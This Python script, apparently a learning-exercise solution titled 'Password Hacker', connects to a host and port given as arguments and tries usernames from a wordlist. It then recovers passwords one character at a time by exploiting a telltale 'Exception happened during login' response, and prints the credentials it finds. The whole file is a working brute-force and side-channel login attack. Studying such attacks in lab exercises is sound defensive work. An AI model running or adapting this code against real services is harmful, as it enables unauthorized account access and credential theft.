import socket
import sys
import random
import json
from string import ascii_letters, digits


abc = ascii_letters + digits
args = sys.argv

with open(r'c:\Users\Lovis\PycharmProjects\Password Hacker\Password Hacker\task\logins.txt', 'r') as file:
    logins_list = file.read().splitlines()


def logins():
    for login in logins_list:
        yield login


def random_login():
    return random.choice(list(logins()))


def random_password(client_socket, abc, start_password=''):
    for char in abc:
        message = json.dumps({"login": login, "password": start_password+char})
        client_socket.send(message.encode())
        cli_response = json.loads(client_socket.recv(1024).decode())
        if cli_response['result'] == 'Wrong password!':
            continue
        elif cli_response['result'] == 'Exception happened during login':
            start_password += char
            return random_password(client_socket, abc, start_password)
        elif cli_response['result'] == 'Connection success!':
            res = start_password + char
            return print(json.dumps({"login": login, "password": res}, indent=4)), exit()


with socket.socket() as client_socket:
    hostname = args[1]
    port = int(args[2])
    address = (hostname, port)
    client_socket.connect(address)
    while True:
        login = random_login()
        message_to_send = json.dumps({"login": login, "password": " "}, indent=4)
        client_socket.send(message_to_send.encode())
        response = json.loads(client_socket.recv(1024).decode())
        if response['result'] == 'Wrong login!':
            continue
        elif response['result'] in [
            'Wrong password!',
            'Exception happened during login'
        ]:
            random_password(client_socket, abc)
